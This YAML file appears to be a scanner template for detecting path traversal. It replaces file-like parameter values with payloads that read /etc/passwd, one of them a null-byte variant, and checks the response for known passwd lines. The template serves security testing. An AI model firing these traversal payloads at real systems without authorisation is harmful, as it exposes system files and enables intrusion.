bug-name: "Path Traversal"
bug-type: "lfi"
target-arguments:
  - type: "regex"
    target: "value"
    part: "all"
    regexes: 
      - ^.*\.(js|json|yaml|lock|yml|md|jsp|jsf|xhtml|xml|class|java|jar|seam|faces|shtml|ifaces|do|action|jspf|properties|bak|sql|zip|xml|old|inc|js|json|conf|cfg|log|yml|yaml|txt|sql|rar|bak)$
number-of-flow: 2
flows:
  match-condition: "all"
  flow_1:
    endpoint: "{{base_url}}"
    payloads:
      - value: "../../../etc/passwd"
        position: "replace"
        tag: "linux"
      
      - value: "../../../../etc/passwd"
        position: "replace"
        tag: "linux"
      
      - value: "../../../../../etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "../../../../../../etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "/etc/passwd"
        position: "replace"
        tag: "linux"

      - value: "../../../etc/passwd\0.png"
        position: "replace"
        tag: "linux"
    verify:
      - function: "contains_any"
        args:
          wordlist:
            - "daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin"
            - "colord:x:114:122:colord"
            - "System"
            - "Resolver,,,:/run/systemd:/usr/sbin/nologin"
            - "mysql:x:106:107:MySQL"
            - "root:x:0:0:root:/root:/bin/bash"
            - "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
            - "bin:x:2:2:bin:/bin:/usr/sbin/nologin"
        expected-value: True
